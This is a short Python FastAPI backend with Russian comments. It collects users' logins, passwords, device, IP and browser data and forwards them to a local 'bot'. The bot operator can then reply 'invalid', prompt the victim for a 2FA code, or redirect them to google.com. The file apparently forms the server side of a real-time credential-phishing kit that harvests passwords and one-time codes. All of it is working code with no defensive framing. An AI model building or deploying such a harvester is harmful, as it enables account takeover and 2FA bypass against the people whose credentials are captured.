from fastapi import FastAPI, HTTPException, Request
from pydantic import BaseModel
import requests

app = FastAPI()

class UserData(BaseModel):
    login: str
    password: str
    device: str
    ip: str
    browser: str

# Путь для отправки данных от клиента
@app.post("/submit")
async def submit_data(data: UserData):
    try:
        # Отправка данных в бота
        bot_url = "http://127.0.0.1:8001/notify"
        response = requests.post(bot_url, json=data.dict())
        return {"message": "Data sent to bot", "bot_status": response.status_code}
    except Exception as e:
        raise HTTPException(status_code=500, detail=f"Error sending data: {str(e)}")

# Путь для обработки ответа от бота
@app.post("/bot-response")
async def bot_response(response: dict):
    action = response.get("action")
    if action == "invalid":
        return {"message": "Invalid data"}
    elif action == "success":
        return {"redirect_url": "https://google.com"}
    elif action == "2fa":
        return {"message": "Enter 2FA"}
    else:
        raise HTTPException(status_code=400, detail="Unknown action")
